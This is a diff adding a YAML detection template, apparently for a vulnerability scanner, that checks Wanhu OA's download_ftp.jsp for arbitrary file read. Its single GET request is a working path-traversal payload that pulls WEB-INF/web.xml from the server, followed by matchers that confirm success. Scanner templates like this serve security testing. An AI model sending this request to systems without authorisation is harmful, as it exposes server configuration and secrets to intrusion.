@@ -1,0 +1,25 @@
+id: wanhu-download-ftp-file-read
+brief:
+    title: Wanhu OA download_ftp.jsp - Arbitrary File Read
+    by: SleepingBag945
+    level: high
+    about: There is an arbitrary file download vulnerability in the Wanhu OA download_ftp.jsp file. An attacker can download any file on the server through the vulnerability.
+    label:
+        - wanhu
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml'
+      signs:
+        - "on": word
+          has:
+            - <?xml version=
+            - web-app
+            - display-name
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
